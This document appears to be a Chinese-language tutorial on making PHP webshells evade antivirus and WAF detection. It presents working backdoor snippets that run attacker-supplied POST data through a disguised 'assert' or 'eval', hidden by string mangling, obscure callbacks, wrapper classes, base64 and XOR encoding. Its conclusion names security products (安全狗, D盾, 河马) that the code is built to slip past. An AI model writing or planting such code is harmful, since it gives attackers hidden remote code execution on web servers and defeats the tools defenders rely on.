<!-- TOC -->

- [1. 关于eval与assert](#1-关于eval与assert)
- [2. 免杀方法](#2-免杀方法)
    - [2.1. 字符串变形](#21-字符串变形)
        - [2.1.1. PHP中关于操作字符串的函数](#211-php中关于操作字符串的函数)
        - [2.1.2. 变形](#212-变形)
    - [2.2. 定义函数](#22-定义函数)
    - [2.3. 回调函数](#23-回调函数)
        - [2.3.1. 回调函数列表](#231-回调函数列表)
        - [2.3.2. 冷门回调函数](#232-冷门回调函数)
        - [2.3.3. 回调函数变形](#233-回调函数变形)
    - [2.4. 特殊字符干扰](#24-特殊字符干扰)
    - [2.5. 数组](#25-数组)
    - [2.6. 类](#26-类)
    - [2.7. 编码](#27-编码)
    - [2.8. 去字符特征](#28-去字符特征)
        - [2.8.1. 利用异或、编码等方式](#281-利用异或编码等方式)
        - [2.8.2. 利用正则匹配字符](#282-利用正则匹配字符)
        - [2.8.3. 利用 POST 包获取关键参数执行](#283-利用-post-包获取关键参数执行)
- [3. 总结](#3-总结)

<!-- /TOC -->
# 1. 关于eval与assert
eval是一个语言构造器而不是一个函数，不能被可变函数调用，例如`<?php $a=eval;$a()?>`就无法正常运行，所以用eval的话不如assert灵活。assert回调函数则允许你简易地捕获传入断言的代码，并包含断言的位置信息。
# 2. 免杀方法
## 2.1. 字符串变形
### 2.1.1. PHP中关于操作字符串的函数
```php
ucwords() //函数把字符串中每个单词的首字符转换为大写
ucfirst() //函数把字符串中的首字符转换为大写
trim() //函数从字符串的两端删除空白字符和其他预定义字符
substr_replace() //函数把字符串的一部分替换为另一个字符串
substr() //函数返回字符串的一部分
strtr() //函数转换字符串中特定的字符
strtoupper() //函数把字符串转换为大写
strtolower() //函数把字符串转换为小写
strtok() //函数把字符串分割为更小的字符串
str_rot13() //函数对字符串执行 ROT13 编码
```
### 2.1.2. 变形
用 substr_replace() 函数变形assert达到免杀的效果
```php
<?php
$a = substr_replace("assexx","rt",4);
$a($_POST['x']);
?>
```
## 2.2. 定义函数
定义一个函数把关键词分割达到bypass效果
```php
<?php 
function kdog($a){
    $a($_POST['x']);
}
kdog(assert);
?>
//另一端
<?php 
function kdog($a){
    assert($a);
}
kdog($_POST[x]);
?>
```
## 2.3. 回调函数
### 2.3.1. 回调函数列表
```php
call_user_func_array()
call_user_func()
array_filter() 
array_walk()  
array_map()
registregister_shutdown_function()
register_tick_function()
filter_var() 
filter_var_array() 
uasort() 
uksort() 
array_reduce()
array_walk() 
array_walk_recursive()
```
### 2.3.2. 冷门回调函数
```php
<?php 
forward_static_call_array(assert,array($_POST[x]));
?>
```
### 2.3.3. 回调函数变形
定义函数或者类来调用回调函数
```php
//定义一个函数
<?php
function test($a,$b){
    array_map($a,$b);
}
test(assert,array($_POST['x']));
?>
//定义一个类
<?php
class loveme {
    var $a;
    var $b;
    function __construct($a,$b) {
        $this->a=$a;
        $this->b=$b;
    }
    function test() {
       array_map($this->a,$this->b);
    }
}
$p1=new loveme(assert,array($_POST['x']));
$p1->test();
?>
```
## 2.4. 特殊字符干扰
```php
//初代版本
<?php
$a = $_REQUEST['a'];
$b = null;
eval($b.$a);
?>
<?php
$a = $_POST['a'];
$b = "\n";
eval($b.=$a);
?>
<?php
function dog($a){
    \assert($a);
}
dog($_POST[x]);
?>
```
## 2.5. 数组
把执行代码放入数组中执行绕过
```php
<?php
$a = substr_replace("assexx","rt",4);
$b=[''=>$a($_POST['q'])];
?>
//多维数组

<?php
$b = substr_replace("assexx","rt",4);
$a = array($arrayName = array('a' => $b($_POST['q'])));
?>
```
## 2.6. 类
说到类肯定要搭配上魔术方法比如 __destruct()，__construct()
```php
<?php 
class me
{
  public $a = '';
  function __destruct(){
    assert("$this->a");
  }
}
$b = new me;
$b->a = $_POST['x'];
?>
//用类把函数包裹,D 盾对类查杀较弱
```
## 2.7. 编码
用 php 的编码函数，或者用异或、简单的 base64_decode, 其中因为他的正则匹配可以加入一些下划线干扰杀软
```php
<?php
$a = base64_decode("YXNz+ZX____J____0");
$a($_POST[x]);
?>
//异或
<?php
$a= ("!"^"@").'ssert';
$a($_POST[x]);
?>
```
## 2.8. 去字符特征
### 2.8.1. 利用异或、编码等方式
```php
<?php
$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`'); // $_='assert';
$__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']'); // $__='_POST';
$___=$$__;
$_($___[_]); // assert($_POST[_]);
```
### 2.8.2. 利用正则匹配字符
### 2.8.3. 利用 POST 包获取关键参数执行
```php
<?php
$decrpt = $_POST['x'];
$arrs = explode("|", $decrpt)[1];
$arrs = explode("|", base64_decode($arrs));
call_user_func($arrs[0],$arrs[1]);
?>
```
# 3. 总结
* 对于安全狗杀形，D盾杀参的思路来绕过。生僻的回调函数，特殊的加密方式，以及关键词的后传入都是不错的选择。
* 对于关键词的后传入对免杀安全狗、D盾、河马等等都是不错的，后期对于菜刀的轮子，也要走向高度的自定义化
* 用户可以对传出的post数据进行自定义脚本加密，再由webshell进行解密获取参数，那么以现在的软WAF查杀能力几乎为0，安全软件也需要与时俱进了。